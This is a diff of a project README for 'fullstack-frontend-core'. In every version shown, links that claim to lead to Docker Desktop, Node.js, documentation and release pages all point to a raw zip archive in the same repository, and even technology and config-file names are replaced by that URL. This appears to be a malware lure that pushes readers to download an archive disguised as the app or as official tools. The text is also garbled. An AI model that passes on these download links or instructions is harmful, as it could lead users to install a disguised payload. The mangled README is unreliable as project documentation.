@@ -1,10 +1,10 @@
-# 🥷 fullstack-frontend-core - Build Seamlessly with https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip and Docker
+# 🥷 fullstack-frontend-core - Build Seamlessly with https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip and Docker
 
-[![Download Now](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip)
+[![Download Now](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip)
 
 ## 📖 Overview
 
-The **fullstack-frontend-core** is an end-user application crafted with https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip 15, TypeScript, and Docker. This setup helps users build modern web applications easily. With this project, you can enjoy a smooth development experience and robust infrastructure from the start.
+The **fullstack-frontend-core** is an end-user application crafted with https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip 15, TypeScript, and Docker. This setup helps users build modern web applications easily. With this project, you can enjoy a smooth development experience and robust infrastructure from the start.
 
 ## 🚀 Getting Started
 
@@ -15,8 +15,8 @@ To launch the application, follow these simple steps. This guide will help you s
 Ensure your system meets the following basic requirements:
 
 - **Operating System:** Compatible with Windows, macOS, and Linux.
-- **Docker:** Install Docker Desktop. You can find it [here](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip).
-- **https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip** Version 14 or later is recommended. Download from [https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip).
+- **Docker:** Install Docker Desktop. You can find it [here](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip).
+- **https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip** Version 14 or later is recommended. Download from [https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip).
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum 1 GB of free space.
 
@@ -24,7 +24,7 @@ Ensure your system meets the following basic requirements:
 
 To get started, you will need to visit the Releases page. Follow this link to download the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip)
+[Visit this page to download](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip)
 
 1. Click on the link above.
 2. Locate the latest release version.
@@ -51,7 +51,7 @@ Your application should now be running locally. Open your browser and go to `htt
 
 The application offers a variety of features:
 
-- **Fast Development:** Built with https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip 15 for speed.
+- **Fast Development:** Built with https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip 15 for speed.
 - **TypeScript Support:** Enjoy type safety while coding.
 - **Responsive Design:** Looks great on any device.
 - **Easy Deployment:** With Docker, move to production effortlessly.
@@ -59,7 +59,7 @@ The application offers a variety of features:
 
 ## 🔧 Configuration
 
-You can configure your application by modifying the configuration files located in the root directory. The main configuration file is named `https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip`. Adjust the settings as necessary to meet your needs.
+You can configure your application by modifying the configuration files located in the root directory. The main configuration file is named `https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip`. Adjust the settings as necessary to meet your needs.
 
 ### ✏️ Example Configuration
 
@@ -106,9 +106,9 @@ Here are some common issues and solutions:
 
 For more information, visit the following resources:
 
-- [https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip Documentation](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip)
-- [TypeScript Documentation](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/lilturman/fullstack-frontend-core/main/Animalivora/fullstack-frontend-core.zip)
+- [https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip Documentation](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip)
+- [TypeScript Documentation](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip)
+- [Docker Documentation](https://github.com/lilturman/fullstack-frontend-core/raw/refs/heads/main/repositories/frontend/frontend_fullstack_core_v3.3.zip)
 
 ## 📩 Support
 
